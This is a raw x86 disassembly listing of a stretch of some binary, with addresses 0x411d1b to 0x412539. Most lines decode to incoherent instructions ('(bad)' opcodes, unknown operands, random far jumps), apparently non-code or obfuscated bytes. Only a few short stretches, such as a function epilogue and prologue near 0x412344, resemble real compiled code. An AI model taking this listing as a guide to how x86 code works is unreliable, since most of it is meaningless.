  411d1b:	imul   esi,eax,0x1e
  411d1e:	call   0x603d:0xc335226c
  411d25:	mov    eax,ds:0x5b66a944
  411d2a:	aas    
  411d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d2c:	or     eax,0x61045e45
  411d31:	xor    DWORD PTR [esi],edi
  411d33:	push   eax
  411d34:	mov    WORD PTR [esi-0x4c],?
  411d37:	pop    edi
  411d38:	cdq    
  411d39:	fiadd  DWORD PTR [edx+eiz*4+0x5]
  411d3d:	or     al,0xf0
  411d3f:	aad    0x16
  411d41:	mov    ebx,0xc503dc83
  411d46:	inc    eax
  411d47:	or     ah,ch
  411d49:	imul   ecx,DWORD PTR [esi],0xae7c801b
  411d4f:	mov    al,0x9c
  411d51:	sahf   
  411d52:	sar    BYTE PTR [edx+0x58],1
  411d55:	inc    edi
  411d56:	addr16 xchg ebx,eax
  411d58:	xlat   BYTE PTR ds:[ebx]
  411d59:	cmp    dh,BYTE PTR [ecx-0x394d1a62]
  411d5f:	inc    ecx
  411d60:	push   esp
  411d61:	nop
  411d62:	dec    eax
  411d63:	iret   
  411d64:	pushf  
  411d65:	pop    esp
  411d66:	sub    eax,0xeba3d05d
  411d6b:	fdivr  QWORD PTR [ebx]
  411d6d:	xchg   esi,eax
  411d6e:	mov    edx,0x78ffd775
  411d73:	mov    ecx,0x7f8c5736
  411d78:	jle    0x411d6e
  411d7a:	shl    BYTE PTR [eax+0x30b9fe60],0x54
  411d81:	inc    eax
  411d82:	popf   
  411d83:	mov    edx,0x474bc36e
  411d88:	mov    dh,0xd4
  411d8a:	or     DWORD PTR [eax],0x9dc6ab6e
  411d90:	in     al,0x83
  411d92:	add    BYTE PTR ds:0x97e8c414,0xcc
  411d99:	sub    BYTE PTR [ebp+0x4dd39dc9],bh
  411d9f:	aaa    
  411da0:	iret   
  411da1:	inc    ebx
  411da2:	fld    QWORD PTR ds:0xa5c4ba24
  411da8:	in     al,0xff
  411daa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dab:	sub    ch,BYTE PTR [ebx]
  411dad:	and    al,0x8c
  411daf:	pop    ss
  411db0:	rol    DWORD PTR [eax],1
  411db2:	sahf   
  411db3:	je     0x411d54
  411db5:	jecxz  0x411d5d
  411db7:	jl     0x411d79
  411db9:	(bad)  
  411dba:	adc    eax,DWORD PTR [esp+ebp*4+0x2f]
  411dbe:	fwait
  411dbf:	adc    ecx,edi
  411dc1:	ins    BYTE PTR es:[edi],dx
  411dc2:	adc    al,0x52
  411dc4:	mov    cl,0x39
  411dc6:	jne    0x411db0
  411dc8:	mov    edx,0xc854a299
  411dcd:	cdq    
  411dce:	pop    eax
  411dcf:	mov    bh,0x79
  411dd1:	ins    DWORD PTR es:[edi],dx
  411dd2:	jmp    DWORD PTR [eax+ebx*2+0x3d7e9149]
  411dd9:	adc    DWORD PTR [edi-0x4b],0xd5a648ba
  411de0:	xor    esi,DWORD PTR [ebx-0x73]
  411de3:	sub    dl,BYTE PTR [ebx-0x4bce494]
  411de9:	push   cs
  411dea:	push   0x3d
  411dec:	mov    esi,0x844afe5c
  411df1:	sbb    DWORD PTR [esi],ebx
  411df3:	ror    BYTE PTR [eax],cl
  411df5:	mov    ecx,0x194afdf3
  411dfa:	retf   0xb779
  411dfd:	sti    
  411dfe:	das    
  411dff:	fs jp  0x411e40
  411e02:	cwde   
  411e03:	and    edi,DWORD PTR [esi]
  411e05:	arpl   cx,sp
  411e07:	mov    eax,ds:0xc0ea3058
  411e0c:	pop    eax
  411e0d:	lods   al,BYTE PTR ds:[esi]
  411e0e:	pop    edi
  411e0f:	inc    ebp
  411e10:	mov    ebp,0xa57ac83
  411e15:	and    BYTE PTR [eax],bl
  411e17:	dec    edi
  411e18:	cmp    eax,0xaa518cdf
  411e1d:	pop    esi
  411e1e:	and    ah,dh
  411e20:	sbb    al,0x83
  411e22:	arpl   WORD PTR [eax+0x2249d0de],sp
  411e28:	pop    esp
  411e29:	ss call 0x112d40aa
  411e2f:	and    esp,ebp
  411e31:	and    dl,0x63
  411e34:	jecxz  0x411e35
  411e36:	outs   dx,DWORD PTR ds:[esi]
  411e37:	test   DWORD PTR [esi+0x3f],esi
  411e3a:	add    al,0x59
  411e3c:	lea    edi,[edx+0x337980de]
  411e42:	push   0x50
  411e44:	daa    
  411e45:	sqrtps xmm0,xmm5
  411e48:	push   ss
  411e49:	cli    
  411e4a:	jo     0x411e3b
  411e4c:	mov    al,0xb7
  411e4e:	sub    ch,dl
  411e50:	fstp   TBYTE PTR [ebp-0x77]
  411e53:	cld    
  411e54:	scas   eax,DWORD PTR es:[edi]
  411e55:	(bad)  
  411e56:	sahf   
  411e57:	xchg   esi,eax
  411e58:	hlt    
  411e59:	int3   
  411e5a:	sub    cl,BYTE PTR [edx]
  411e5c:	push   esp
  411e5d:	icebp  
  411e5e:	inc    edx
  411e5f:	mov    ds:0xdb143c1c,al
  411e64:	js     0x411e0f
  411e66:	cmp    eax,DWORD PTR [ecx+0x1eea5228]
  411e6c:	push   esi
  411e6d:	xchg   ebp,eax
  411e6e:	mov    ecx,0x49f1fc41
  411e73:	ins    DWORD PTR es:[edi],dx
  411e74:	inc    ebp
  411e75:	(bad)  
  411e77:	mov    eax,ds:0x34e91a60
  411e7c:	cld    
  411e7d:	lds    edx,FWORD PTR [esi+0x4ded6e5d]
  411e83:	rol    DWORD PTR [esi+0x24d6c7bf],0xcb
  411e8a:	ret    
  411e8b:	push   ss
  411e8c:	mul    esp
  411e8e:	addr16 in al,0x58
  411e91:	sti    
  411e92:	add    BYTE PTR [ebp-0x13ef0e0b],0x8f
  411e99:	pop    ecx
  411e9a:	sahf   
  411e9b:	ror    BYTE PTR es:0xc886be02,0x64
  411ea3:	sbb    eax,0x297ac4c7
  411ea8:	(bad)  [edx]
  411eaa:	repnz xor al,0xe2
  411ead:	daa    
  411eae:	lock mov cl,0x3
  411eb1:	or     BYTE PTR [eax+0x23],al
  411eb4:	or     ecx,esi
  411eb6:	pop    edi
  411eb7:	jmp    0x37ecf808
  411ebc:	xchg   esi,eax
  411ebd:	cs fwait
  411ebf:	mov    ah,0x8b
  411ec1:	mov    edi,0xf04b710e
  411ec6:	mov    ds:0x73f09e46,eax
  411ecb:	fisttp DWORD PTR [ecx+0x30]
  411ece:	mov    eax,ds:0x1fdfc773
  411ed3:	dec    ecx
  411ed4:	ror    DWORD PTR [edi-0x62],0x5e
  411ed8:	sar    DWORD PTR [edi+ebx*8-0x1b3a3874],cl
  411edf:	mov    ds:0xe7728a7e,al
  411ee4:	push   ecx
  411ee5:	jo     0x411edb
  411ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ee8:	jp     0x411f36
  411eea:	sbb    al,0x71
  411eec:	std    
  411eed:	jne    0x411f0a
  411eef:	aaa    
  411ef0:	sti    
  411ef1:	pop    edi
  411ef2:	and    BYTE PTR [eax-0xd333d3c],ah
  411ef8:	std    
  411ef9:	mov    edx,0x52e9f1e2
  411efe:	mov    esp,0x5ca7dce3
  411f03:	push   edi
  411f04:	or     DWORD PTR [ecx],edx
  411f06:	fcom   DWORD PTR [ebx-0x43024c0b]
  411f0c:	inc    eax
  411f0d:	fild   WORD PTR [esi]
  411f0f:	cdq    
  411f10:	cs inc ebp
  411f12:	push   esp
  411f13:	aas    
  411f14:	cdq    
  411f15:	lods   al,BYTE PTR ds:[esi]
  411f16:	js     0x411f73
  411f18:	ss lahf 
  411f1a:	js     0x411edc
  411f1c:	retf   0x16b
  411f1f:	or     ebp,DWORD PTR [esp+ebp*4]
  411f22:	fild   WORD PTR [esp+edx*1-0x1a]
  411f26:	or     DWORD PTR [ebx+ecx*2-0x78],esi
  411f2a:	out    dx,al
  411f2b:	dec    esp
  411f2c:	ja     0x411ed8
  411f2e:	mov    dh,0x6a
  411f30:	stos   BYTE PTR es:[edi],al
  411f31:	cmp    eax,ebx
  411f33:	fs ins DWORD PTR es:[edi],dx
  411f35:	cmp    dl,BYTE PTR [ebp+ebx*4+0x46]
  411f39:	pop    eax
  411f3a:	add    esp,ecx
  411f3c:	dec    ebx
  411f3d:	mov    ecx,DWORD PTR [esi]
  411f3f:	bound  edx,QWORD PTR [edi]
  411f41:	mov    eax,0xa3d3ea2a
  411f46:	add    eax,DWORD PTR [esi-0x77]
  411f49:	cld    
  411f4a:	push   ebx
  411f4b:	or     DWORD PTR [ebx],eax
  411f4d:	xor    cl,bh
  411f4f:	clc    
  411f50:	sbb    esp,DWORD PTR [edx]
  411f52:	fs pop esp
  411f54:	jne    0x411fbb
  411f56:	jg     0x411f6c
  411f58:	sbb    DWORD PTR ds:0x475e3b14,edx
  411f5e:	jno    0x411f97
  411f60:	sub    edx,DWORD PTR [eax+0x5b]
  411f63:	fadd   QWORD PTR [esi]
  411f65:	ins    BYTE PTR es:[edi],dx
  411f66:	jae    0x411f1b
  411f68:	xchg   edx,eax
  411f69:	jnp    0x411fa1
  411f6b:	js     0x411f8f
  411f6d:	xor    eax,0x991a0c5e
  411f72:	test   eax,0xb8ab044f
  411f77:	repz mov esp,DWORD PTR [ebx-0x4]
  411f7b:	push   cs
  411f7c:	mov    ds:0x9ab95e1a,eax
  411f81:	mov    ecx,0x1f2dd7c7
  411f86:	sub    ch,BYTE PTR [edx]
  411f88:	in     eax,dx
  411f89:	mov    ebp,0xd3616d2
  411f8e:	mov    al,0xa9
  411f90:	jo     0x411f3a
  411f92:	cmc    
  411f93:	xor    al,0xe1
  411f95:	xor    eax,0x5a70f007
  411f9a:	in     al,0xcd
  411f9c:	data16 arpl WORD PTR [edi-0x16],cx
  411fa0:	retf   
  411fa1:	inc    edi
  411fa2:	inc    ebx
  411fa3:	out    dx,eax
  411fa4:	cli    
  411fa5:	out    0xb3,eax
  411fa7:	pop    edi
  411fa8:	add    eax,0xdd3d74d
  411fad:	dec    ebx
  411fae:	cld    
  411faf:	cmp    BYTE PTR [ecx-0x5f],al
  411fb2:	add    al,0xb2
  411fb4:	imul   esi,DWORD PTR [edi-0x77],0xffffffb1
  411fb8:	push   eax
  411fb9:	mov    dl,0xb9
  411fbb:	ins    DWORD PTR es:[edi],dx
  411fbc:	jnp    0x411f9d
  411fbe:	jnp    0x41202b
  411fc0:	fnstcw WORD PTR [esi]
  411fc2:	adc    esi,esi
  411fc4:	push   0xedf4712c
  411fc9:	sti    
  411fca:	mov    ebx,fs
  411fcc:	cmp    eax,0x31506b27
  411fd1:	xor    eax,DWORD PTR [eax+edi*8-0x7c8996be]
  411fd8:	lahf   
  411fd9:	imul   eax,eax,0x43bd290
  411fdf:	and    eax,edx
  411fe1:	or     eax,0x1a40
  411fe6:	xor    eax,0x1ac1
  411feb:	add    ecx,eax
  411fed:	mov    eax,DWORD PTR [ebp-0x18]
  411ff0:	mov    edx,0x7380
  411ff5:	sub    edx,eax
  411ff7:	add    edx,DWORD PTR [ebp-0x1c]
  411ffa:	mov    eax,DWORD PTR [ebp-0x20]
  411ffd:	xor    edx,eax
  411fff:	mov    eax,DWORD PTR [ebp-0x24]
  412002:	and    edx,eax
  412004:	mov    eax,DWORD PTR [ebp+0x10]
  412007:	jmp    0x412310
  41200c:	icebp  
  41200d:	or     DWORD PTR [ebp+0x7c3cad28],0xcf30669c
  412017:	nop
  412018:	in     al,0x54
  41201a:	jl     0x411fae
  41201c:	pop    esp
  41201d:	mov    si,0x8ebe
  412021:	ret    0xbebe
  412024:	and    BYTE PTR [edi+ebp*4],0xda
  412028:	and    eax,0x7a7681ca
  41202d:	shl    DWORD PTR [ecx],1
  41202f:	sbb    eax,0x47983056
  412034:	ss jg  0x411fdb
  412037:	adc    DWORD PTR [esp+edi*8],ecx
  41203a:	inc    ebx
  41203b:	shl    DWORD PTR [edi-0x55],1
  41203e:	sbb    edx,DWORD PTR [ebp-0x5895c048]
  412044:	jge    0x41207d
  412046:	dec    esi
  412047:	fisttp QWORD PTR gs:[esi-0x5724dba6]
  41204e:	push   0x65a54608
  412053:	adc    al,BYTE PTR [ecx+0x49]
  412056:	popa   
  412057:	pcmpeqd mm2,QWORD PTR [esi-0x2c08c09e]
  41205e:	lahf   
  41205f:	mov    ?,WORD PTR [eax-0x40]
  412062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412063:	data16 fisttp QWORD PTR [edx+0x7f]
  412067:	cs in  al,dx
  412069:	fwait
  41206a:	and    dl,BYTE PTR [ebx-0x54]
  41206d:	xor    edi,DWORD PTR cs:[esi]
  412070:	and    al,ah
  412072:	mov    ebx,0x2a2f46fc
  412077:	adc    bh,ch
  412079:	mov    ebx,0xbe5fc768
  41207e:	fadd   st,st(7)
  412080:	xchg   ebp,eax
  412081:	jne    0x41205d
  412083:	pop    eax
  412084:	fnstcw WORD PTR [edx+0x7f802846]
  41208a:	push   cs
  41208b:	jecxz  0x412033
  41208d:	adc    al,0x0
  41208f:	es and eax,0x2d278ec7
  412095:	out    0x53,al
  412097:	nop
  412098:	push   ecx
  412099:	dec    esi
  41209a:	mov    bh,0x92
  41209c:	mov    esp,0x507c8608
  4120a1:	mov    ebp,DWORD PTR [ecx]
  4120a3:	call   0xe88579d4
  4120a8:	push   ebp
  4120a9:	pop    esi
  4120aa:	inc    ebx
  4120ab:	lods   eax,DWORD PTR ds:[esi]
  4120ac:	mov    eax,ds:0xe1e8b2fc
  4120b1:	sbb    eax,0xb53629c9
  4120b6:	push   ebx
  4120b7:	and    DWORD PTR [edi+0xc],esi
  4120ba:	inc    edx
  4120bb:	mov    esi,0xecbb037f
  4120c0:	mov    edx,0xc25c6727
  4120c5:	mov    dl,0x3f
  4120c7:	xchg   DWORD PTR [ebp-0x15d9b57b],edx
  4120cd:	mov    esp,0x863fe675
  4120d2:	loope  0x4120ec
  4120d4:	aad    0xcc
  4120d6:	out    dx,eax
  4120d7:	ficom  DWORD PTR [eax-0x5f486e71]
  4120dd:	aaa    
  4120de:	repnz lods al,BYTE PTR ds:[esi]
  4120e0:	sub    al,0x84
  4120e2:	cld    
  4120e3:	mov    dh,0xaa
  4120e5:	sar    BYTE PTR [ebx-0x9],1
  4120e8:	jno    0x4120ba
  4120ea:	fs add ebp,ebp
  4120ed:	dec    eax
  4120ee:	cmp    bh,al
  4120f0:	mov    esi,0x51d51da2
  4120f5:	pop    ebx
  4120f6:	dec    esp
  4120f7:	cld    
  4120f8:	ds or  eax,0x24d9baa4
  4120fe:	add    DWORD PTR [eax-0xb],0x279f8b25
  412105:	mov    eax,DWORD PTR [ebp-0x77]
  412108:	sbb    BYTE PTR [ebx],bh
  41210a:	mov    esp,DWORD PTR [ecx+0x584f806d]
  412110:	xchg   ebp,eax
  412111:	xchg   edx,eax
  412112:	cwde   
  412113:	das    
  412114:	adc    DWORD PTR ds:0x98a191e2,eax
  41211a:	fucomi st,st(2)
  41211c:	test   eax,0xf7122246
  412121:	push   es
  412122:	repnz sbb edi,DWORD PTR [esi]
  412125:	mov    ch,0xa1
  412127:	mov    al,0x5b
  412129:	mov    edi,0xd9d75370
  41212e:	das    
  41212f:	and    DWORD PTR [esi],0xfffffffd
  412132:	ins    DWORD PTR es:[edi],dx
  412133:	and    ch,bl
  412135:	mov    bh,0x4
  412137:	inc    ebx
  412138:	arpl   WORD PTR [edx+0x1bcd567b],bx
  41213e:	cmp    ecx,DWORD PTR [eax-0x4beaf7be]
  412144:	mov    edi,0xd5a0c70d
  412149:	into   
  41214a:	and    al,0x2a
  41214c:	jmp    0x626e:0xdf11878f
  412153:	enter  0x2760,0x62
  412157:	sbb    bl,BYTE PTR [eax]
  412159:	and    ecx,DWORD PTR [edx-0x7dd634e8]
  41215f:	adc    eax,0xaff8f482
  412164:	ror    ebp,1
  412166:	jp     0x41210c
  412168:	jp     0x4121c5
  41216a:	add    al,0x72
  41216c:	cs call 0x3046:0x793e0f0b
  412174:	je     0x412161
  412176:	je     0x41214d
  412178:	clc    
  412179:	loope  0x412188
  41217b:	gs pop edi
  41217d:	ror    ebp,0x97
  412180:	(bad)  
  412181:	lea    edi,[eax-0x40f6910a]
  412187:	or     dh,BYTE PTR [eax+0x88d7474]
  41218d:	or     al,0x5e
  41218f:	inc    ebx
  412190:	pop    ebp
  412191:	dec    edi
  412192:	xlat   BYTE PTR ds:[ebx]
  412193:	(bad)  
  412194:	shl    ebp,0x45
  412197:	xchg   edx,eax
  412198:	add    esp,DWORD PTR [ecx-0x5a]
  41219b:	loopne 0x412140
  41219d:	mov    bl,0x79
  41219f:	(bad)  
  4121a0:	in     al,dx
  4121a1:	inc    edx
  4121a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121a3:	fnstenv [ebp+0xb]
  4121a6:	cmp    BYTE PTR [edi],bh
  4121a8:	div    BYTE PTR [ecx]
  4121aa:	sbb    ah,BYTE PTR [edi+0x206b0420]
  4121b0:	shr    BYTE PTR [ebp-0x74],0x5d
  4121b4:	div    BYTE PTR [edx-0x6c230292]
  4121ba:	imul   ecx,DWORD PTR [edx+0xaafed8b],0x665058b3
  4121c4:	cdq    
  4121c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c6:	jns    0x41214c
  4121c8:	xor    eax,edx
  4121ca:	jno    0x4121b0
  4121cc:	(bad)  
  4121cd:	mov    bl,0x5
  4121cf:	(bad)  
  4121d0:	(bad)  [edx-0x1ced7f9e]
  4121d6:	adc    DWORD PTR [esi],esi
  4121d8:	and    eax,0xb3955ee2
  4121dd:	dec    ebx
  4121de:	test   edi,ebx
  4121e0:	jle    0x41224e
  4121e2:	sbb    bl,BYTE PTR [edi-0x75]
  4121e5:	fldcw  WORD PTR [ebx]
  4121e7:	(bad)  
  4121e8:	sbb    bh,BYTE PTR [eax]
  4121ea:	mov    edi,0x275bcb2c
  4121ef:	ficom  WORD PTR [ebx-0x4a91dc7e]
  4121f5:	and    DWORD PTR ds:0xc4dffcc2,eax
  4121fb:	mov    ebp,0xf20808b2
  412200:	cmp    al,0xaa
  412202:	dec    BYTE PTR [ecx]
  412204:	out    0xc3,al
  412206:	(bad)  
  412207:	(bad)  
  412208:	and    cl,BYTE PTR [edi-0x80]
  41220b:	loop   0x412226
  41220d:	lock aas 
  41220f:	fucomp st(4)
  412211:	test   al,0x94
  412213:	sbb    eax,0x3ab17f2f
  412218:	or     cl,dl
  41221a:	(bad)  
  41221b:	sahf   
  41221c:	adc    eax,0x10e8fc3e
  412221:	sahf   
  412222:	mov    eax,0xcb88729b
  412227:	jbe    0x4121fe
  412229:	cdq    
  41222a:	(bad)  
  41222c:	sub    al,0xe2
  41222e:	dec    eax
  41222f:	cs pop eax
  412231:	jnp    0x41224a
  412233:	repz clc 
  412235:	pusha  
  412236:	sub    BYTE PTR [eax+0x3992e3e3],ah
  41223c:	(bad)  
  41223d:	adc    edx,eax
  41223f:	arpl   WORD PTR [ebp+0x30],sp
  412242:	sub    DWORD PTR [eax+0x3],ebp
  412245:	pop    esp
  412246:	sahf   
  412247:	rcl    BYTE PTR [esi-0x62],cl
  41224a:	in     eax,0x6e
  41224c:	dec    edi
  41224d:	imul   ebp,DWORD PTR [edi-0x39],0x1
  412251:	mov    cl,0x60
  412253:	fisub  WORD PTR [edx+0x25a84231]
  412259:	dec    ecx
  41225a:	call   0x2a8f:0x34c2527c
  412261:	int3   
  412262:	cs xchg edx,edi
  412265:	add    bh,BYTE PTR ds:0xa0c81166
  41226b:	aam    0x2d
  41226d:	dec    esp
  41226e:	adc    al,0xac
  412270:	shl    BYTE PTR [eax+0x2207e8a],0x97
  412277:	frstor [edx+0x44]
  41227a:	mov    WORD PTR [esp+esi*4-0x2d],gs
  41227e:	test   eax,0x3b818820
  412283:	cmp    eax,0xb25d1a70
  412288:	add    al,0x16
  41228a:	sub    esp,edi
  41228c:	inc    esp
  41228d:	mov    dl,0x5f
  41228f:	mov    ch,0xc5
  412291:	daa    
  412292:	loop   0x4122fa
  412294:	out    0xdd,al
  412296:	aas    
  412297:	pusha  
  412298:	xchg   ebx,eax
  412299:	jmp    DWORD PTR [edx-0x47]
  41229c:	lahf   
  41229d:	ja     0x41225e
  41229f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a0:	push   ss
  4122a1:	idiv   BYTE PTR [esi-0x594d74cf]
  4122a7:	ret    0xe76d
  4122aa:	sub    al,0x92
  4122ac:	adc    ch,BYTE PTR ds:0xaba593bc
  4122b2:	je     0x4122b9
  4122b4:	leave  
  4122b5:	adc    ebp,esi
  4122b7:	xchg   esi,eax
  4122b8:	jmp    0x77ff0653
  4122bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122be:	outs   dx,DWORD PTR ds:[esi]
  4122bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122c0:	jl     0x412311
  4122c2:	sub    ch,BYTE PTR [esp+esi*2+0x7edea84d]
  4122c9:	shl    ecx,cl
  4122cb:	scas   al,BYTE PTR es:[edi]
  4122cc:	and    ebp,DWORD PTR [esi]
  4122ce:	jb     0x4122fd
  4122d0:	cmp    ebx,DWORD PTR [eax-0x4b]
  4122d3:	jmp    0x817f3c38
  4122d8:	xor    BYTE PTR [edx],bl
  4122da:	adc    eax,DWORD PTR [esi-0x7c]
  4122dd:	pop    esp
  4122de:	xchg   ebp,eax
  4122df:	push   esp
  4122e0:	jmp    0x4122c9
  4122e2:	je     0x4122d3
  4122e4:	pusha  
  4122e5:	(bad)  
  4122e6:	aad    0xe3
  4122e8:	push   esp
  4122e9:	push   ds
  4122ea:	inc    ebp
  4122eb:	xchg   edi,eax
  4122ec:	push   ss
  4122ed:	mov    edi,0xe2509257
  4122f2:	add    edi,DWORD PTR [esi-0x260e0d8a]
  4122f8:	pop    edx
  4122f9:	lds    ebp,FWORD PTR ds:0xf8b120e9
  4122ff:	mov    esi,0x32b7925
  412304:	jle    0x4122d6
  412306:	sar    BYTE PTR [edx+0x65],cl
  412309:	das    
  41230a:	lods   al,BYTE PTR ds:[esi]
  41230b:	dec    esp
  41230c:	ret    
  41230d:	push   0xf2811e4b
  412312:	adc    eax,0x2b000070
  412317:	ret    0x558b
  41231a:	fmul   DWORD PTR [ebx-0x1d7e2b8b]
  412320:	jnp    0x41234c
  412322:	add    BYTE PTR [eax],al
  412324:	lea    edx,[edx+esi*1-0x3571]
  41232b:	mov    esi,DWORD PTR [ebp-0x30]
  41232e:	shr    edx,1
  412330:	or     edx,esi
  412332:	mov    esi,ecx
  412334:	sub    esi,edx
  412336:	add    esi,0x4751
  41233c:	cmp    esi,eax
  41233e:	jbe    0x411c83
  412344:	pop    esi
  412345:	leave  
  412346:	ret    0xc
  412349:	push   ebp
  41234a:	mov    ebp,esp
  41234c:	sub    esp,0x80
  412352:	push   ebx
  412353:	jmp    0x41268c
  412358:	push   0xffffffd2
  41235a:	jnp    0x4122dc
  41235c:	jl     0x412306
  41235e:	mov    edx,0xa0fab73b
  412363:	nop
  412364:	repz mov eax,ds:0x6c2ca4ba
  41236a:	mov    esi,0xbec4edbe
  41236f:	mov    esi,0x91bc6b40
  412374:	jno    0x4123d5
  412376:	leave  
  412377:	jnp    0x4123de
  412379:	sbb    dh,BYTE PTR [ecx-0x5f]
  41237c:	add    eax,0xf289e6f0
  412381:	bound  esp,QWORD PTR [esi]
  412383:	mov    ds:0xd678dbc3,al
  412388:	push   cs
  412389:	imul   ebx,esi,0x5c
  41238c:	popf   
  41238d:	(bad)  
  41238e:	lds    esi,FWORD PTR ds:0xc29113c6
  412394:	inc    esp
  412395:	jns    0x4123ea
  412397:	xrelease xchg BYTE PTR [edx-0xb],cl
  41239b:	mov    esi,0xd2a2383b
  4123a0:	mov    dl,0xaf
  4123a2:	ja     0x41233d
  4123a4:	adc    DWORD PTR [edi-0x30],eax
  4123a7:	ins    BYTE PTR es:[edi],dx
  4123a8:	inc    esi
  4123a9:	pop    ds
  4123aa:	cdq    
  4123ab:	loop   0x4123b6
  4123ad:	test   al,0x86
  4123af:	aaa    
  4123b0:	cmp    al,0x12
  4123b2:	mov    ch,0x31
  4123b4:	dec    esi
  4123b5:	mov    edi,0xba8c3545
  4123ba:	aad    0xff
  4123bc:	xchg   BYTE PTR [edx-0x2c4f694e],dl
  4123c2:	fdivr  DWORD PTR [edx]
  4123c4:	xchg   DWORD PTR [eax],ecx
  4123c6:	sar    ecx,cl
  4123c8:	mov    eax,ds:0xcc06b279
  4123cd:	lds    eax,FWORD PTR [edi-0x66]
  4123d0:	mov    edx,0x5de31dbc
  4123d5:	test   BYTE PTR [eax+0x2f9fea],dh
  4123db:	adc    cl,BYTE PTR [esi]
  4123dd:	fst    QWORD PTR [eax-0x5c98f5cc]
  4123e3:	stc    
  4123e4:	xrelease mov BYTE PTR [edx-0x1f],ah
  4123e8:	sub    eax,DWORD PTR [edx+0x24ebae8d]
  4123ee:	add    al,0xf5
  4123f0:	add    eax,0xc5e9d91a
  4123f5:	sbb    ecx,edx
  4123f7:	jno    0x412407
  4123f9:	mov    dh,0xf5
  4123fb:	xchg   cl,cl
  4123fd:	sbb    al,0x11
  4123ff:	ret    0x2185
  412402:	loope  0x4123fb
  412404:	xor    al,0x28
  412406:	mov    ebx,ebx
  412408:	inc    ebx
  412409:	or     dl,al
  41240b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41240c:	mov    ecx,0xe956530c
  412411:	dec    esi
  412412:	bound  ebp,QWORD PTR [edx-0x73]
  412415:	xchg   esi,eax
  412416:	test   eax,0xcb553d59
  41241b:	dec    esp
  41241c:	add    ecx,DWORD PTR [eax+esi*1+0x2c]
  412420:	scas   eax,DWORD PTR es:[edi]
  412421:	push   esp
  412422:	fnstsw WORD PTR [esi-0x48]
  412425:	imul   esp,DWORD PTR [ebp+0x21],0x2be4d202
  41242c:	aaa    
  41242d:	stos   DWORD PTR es:[edi],eax
  41242e:	outs   dx,DWORD PTR es:[esi]
  412430:	fsub   st(0),st
  412432:	mov    ds:0x59bb272f,al
  412437:	sub    DWORD PTR [esi-0x7b42ff8f],esp
  41243d:	xchg   ebx,eax
  41243e:	neg    DWORD PTR [edx]
  412440:	data16 mov ah,0xa3
  412443:	mov    dh,0x4c
  412445:	pop    edx
  412446:	mov    edi,0x52af5c88
  41244b:	sbb    eax,0xd5e28e34
  412450:	adc    edi,DWORD PTR [ebp+0x216567e6]
  412456:	add    eax,0x1e09a05c
  41245b:	loop   0x4124c7
  41245d:	jle    0x41249e
  41245f:	into   
  412460:	retf   0x618f
  412463:	jmp    0x2eba:0xed338392
  41246a:	jmp    0xbdf4:0x24770e04
  412471:	fiadd  DWORD PTR [ecx-0x3d1bade1]
  412477:	fnstenv [esi-0x34c761ca]
  41247d:	inc    ecx
  41247e:	and    DWORD PTR [edi],0x11
  412481:	(bad)  
  412482:	enter  0xc1cb,0x7
  412486:	sbb    dl,al
  412488:	cld    
  412489:	cmp    al,0x1a
  41248b:	jo     0x4124a1
  41248d:	xchg   esi,eax
  41248e:	shl    DWORD PTR [ecx+edx*4],0xa
  412492:	add    DWORD PTR [edx],edx
  412494:	and    al,0x56
  412496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412497:	push   cs
  412498:	add    dh,al
  41249a:	sti    
  41249b:	and    al,dl
  41249d:	pop    esp
  41249e:	xchg   edx,eax
  41249f:	sbb    al,0x1
  4124a1:	mul    DWORD PTR [eax+0x10be7d2f]
  4124a7:	popf   
  4124a8:	xchg   esi,eax
  4124a9:	out    0xb3,al
  4124ab:	jne    0x412509
  4124ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ae:	xlat   BYTE PTR ds:[ebx]
  4124af:	mov    ?,ebx
  4124b1:	mov    bh,0x4c
  4124b3:	mov    ecx,0x2d921159
  4124b8:	loop   0x41247c
  4124ba:	sbb    bl,BYTE PTR [edx-0x50]
  4124bd:	pop    esi
  4124be:	les    ebp,FWORD PTR [eax]
  4124c0:	sub    bl,BYTE PTR [ebp-0x70]
  4124c3:	in     al,dx
  4124c4:	xchg   edx,eax
  4124c5:	jecxz  0x4124c2
  4124c7:	in     al,dx
  4124c8:	pop    ebp
  4124c9:	push   cs
  4124ca:	int    0xf5
  4124cc:	sub    al,0x12
  4124ce:	out    0x8e,eax
  4124d0:	popa   
  4124d1:	fcmovnbe st,st(5)
  4124d3:	adc    DWORD PTR [ecx],edx
  4124d5:	ror    esi,cl
  4124d7:	sub    dl,al
  4124d9:	and    dl,bl
  4124db:	shr    BYTE PTR [eax],1
  4124dd:	or     dl,BYTE PTR [esp+esi*2-0x42f9b8c4]
  4124e4:	dec    esp
  4124e5:	push   ecx
  4124e6:	jns    0x412528
  4124e8:	test   BYTE PTR [ecx-0x40f7fc27],dh
  4124ee:	add    edi,ebx
  4124f0:	push   0xb67977c0
  4124f5:	mov    edx,0x1e5c679
  4124fa:	bound  eax,QWORD PTR [edx]
  4124fc:	stos   BYTE PTR es:[edi],al
  4124fd:	mov    esp,0x422de041
  412502:	lods   al,BYTE PTR ds:[esi]
  412503:	mov    ebx,0x22e38ad2
  412508:	loop   0x412524
  41250a:	add    esi,DWORD PTR [eax-0x6a]
  41250d:	or     BYTE PTR [edx+edi*4-0x58],ah
  412511:	xchg   ecx,eax
  412512:	mov    bh,dl
  412514:	pop    ebx
  412515:	and    eax,0xb13b0f61
  41251a:	push   eax
  41251b:	jecxz  0x41252b
  41251d:	and    bh,BYTE PTR [esi]
  41251f:	into   
  412520:	pop    esi
  412521:	daa    
  412522:	pop    es
  412523:	test   eax,0x2b4df544
  412528:	sub    ah,BYTE PTR [eax-0x24a721fb]
  41252e:	bound  ecx,QWORD PTR [ebp-0x2c504deb]
  412534:	jmp    DWORD PTR [esi-0x2f]
  412537:	rol    esi,cl
  412539:	mov    es,WORD PTR ss:[esi+0x18cd2e1]
